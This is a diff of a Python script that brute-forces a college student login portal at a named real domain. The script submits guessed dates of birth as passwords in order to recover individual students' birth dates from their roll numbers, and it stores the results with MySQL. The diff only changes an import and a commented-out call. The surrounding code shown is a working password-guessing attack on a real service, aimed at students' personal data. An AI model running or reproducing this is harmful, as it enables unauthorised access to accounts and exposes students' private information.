@@ -1,4 +1,4 @@
-import requests
+from requests import post
 import mysql.connector
 
 student_login_url = 'http://studentlogin.kcgcollege.ac.in/'
@@ -35,7 +35,7 @@ def check_date(The_day_):
     student_login_payload['txtpassword'] = The_day_
                 
     try:
-        page = requests.post(student_login_url, data = student_login_payload, timeout = 10)
+        page = post(student_login_url, data = student_login_payload, timeout = 10)
         #print(The_day_)
     except:
         #print('timed out', The_day_)
@@ -131,7 +131,7 @@ def find_student_dob(user_id, year_of_birth = None):
     raise Exception   
 
 
-#find_student_dob('20cs050')  
+#print(find_student_dob('20cs050')  )
 
 #find_student_dob('311020104023', '2003')                        
             
